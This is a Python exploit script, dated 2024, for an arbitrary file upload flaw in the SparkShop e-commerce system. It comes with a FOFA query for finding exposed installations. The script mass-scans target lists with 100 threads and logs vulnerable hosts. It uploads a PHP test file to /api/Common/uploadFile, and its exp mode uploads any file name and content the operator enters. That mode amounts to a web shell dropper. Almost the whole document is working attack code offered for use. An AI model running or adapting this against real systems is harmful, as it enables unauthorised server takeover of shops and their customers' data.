# 南京星源图科技_SparkShop_任意文件上传漏洞
#FOFA:"SparkShop"

import requests,re,argparse,json,sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    test = """
        
            ███████╗██████╗  █████╗ ██████╗ ██╗  ██╗███████╗██╗  ██╗ ██████╗ ██████╗ 
            ██╔════╝██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██║  ██║██╔═══██╗██╔══██╗
            ███████╗██████╔╝███████║██████╔╝█████╔╝ ███████╗███████║██║   ██║██████╔╝
            ╚════██║██╔═══╝ ██╔══██║██╔══██╗██╔═██╗ ╚════██║██╔══██║██║   ██║██╔═══╝ 
            ███████║██║     ██║  ██║██║  ██║██║  ██╗███████║██║  ██║╚██████╔╝██║     
            ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     
                                                                            author:秋妤
                                                                            date:2024.09.03
                                                                            version:1.0                                                                       

    """
    print(test)

def poc(target):
    payload = "/api/Common/uploadFile"
    data = (
        "------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\"; filename=\"qiuyv.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php echo 'hello This is qiuyv'; ?>\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--"
    )

    headers = {
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
        "Content-Length": str(len(data))
    }

    try:
        res1 = requests.get(target)
        if res1.status_code == 200:
            res2 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=5)
            if res2.status_code == 200:
                res3 = res2.json()
                if res3.get('msg') == "upload success":
                    data = res3['data']
                    url = data['url']
                    print(f"{target} 存在文件上传漏洞\n上传地址 {url}")
                    with open('南京星源图科技_result.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[+]{target} 存在文件上传漏洞[+]上传地址 {url}\n")
                    return True
                else:
                    print(f"{target} 不存在文件上传漏洞")
            else:
                print(f"{target} 文件上传请求失败，状态码: {res2.status_code}")
        else:
            print(f"{target} 目标不可达，状态码: {res1.status_code}")
    except Exception as e:
        print(e)

def exp(target):
    try:
        file_name = input("请输入要上传的文件名：")
        put = input("请输入要上传的文件内容：")
        data = (
            "------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+ file_name +"\"\r\nContent-Type: application/x-php\r\n\r\n" + put + "\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--"
        )

        headers = {
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
            "Content-Length": str(len(data))
        }
        payload = "/api/Common/uploadFile"

        res = requests.post(target + payload, headers=headers, data=data, verify=False)
        if res.status_code == 200:
            try:
                res_json = res.json()
                if res_json.get('msg') == "upload success":
                    data = res_json['data']
                    url = data['url']
                    print(f"上传成功！PHP文件地址：{url}")
                else:
                    print("文件上传失败")
            except json.JSONDecodeError:
                print("返回内容不是有效的 JSON")
        else:
            print(f"文件上传请求失败，状态码: {res.status_code}")
    except Exception as e:
        print(f"请求出错: {e}")

def main():
    banner()
    parser = argparse.ArgumentParser("这是一个南京星源图科技任意文件上传漏洞的扫描脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            url_list = [url.strip() for url in f.readlines()]
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()